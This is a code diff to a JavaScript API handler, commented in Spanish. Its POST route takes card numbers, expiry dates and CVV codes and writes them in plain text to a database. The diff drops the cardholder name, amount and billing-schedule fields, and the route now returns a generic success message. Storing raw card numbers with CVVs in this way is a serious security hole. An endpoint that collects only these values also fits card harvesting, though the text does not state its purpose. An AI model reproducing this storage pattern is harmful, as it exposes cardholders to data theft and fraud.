@@ -32,30 +32,25 @@ export default async function handler(req, res) {
 
             case 'POST':
                 // Agregar nueva tarjeta
-                const { cardHolder, cardNumber, expiryDate, cvv, amount } = req.body;
+                const { cardNumber, expiryDate, cvv } = req.body;
                 
                 // Validaciones básicas
-                if (!cardHolder || !cardNumber || !expiryDate || !cvv || !amount) {
+                if (!cardNumber || !expiryDate || !cvv) {
                     res.status(400).json({ error: 'Faltan campos requeridos' });
                     return;
                 }
 
                 const newCard = {
-                    cardHolder,
-                    cardNumber,
+                    cardNumber: cardNumber.replace(/\s/g, ''),
                     expiryDate,
                     cvv,
                     status: 'pending',
-                    amount: Number(amount),
-                    nextChargeDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 días desde ahora
-                    chargeAttempts: 0,
-                    notes: '',
                     createdAt: new Date(),
                     updatedAt: new Date()
                 };
 
                 const result = await collection.insertOne(newCard);
-                res.status(201).json(result);
+                res.status(201).json({ success: true, message: 'Tarjeta guardada exitosamente' });
                 break;
 
             default:
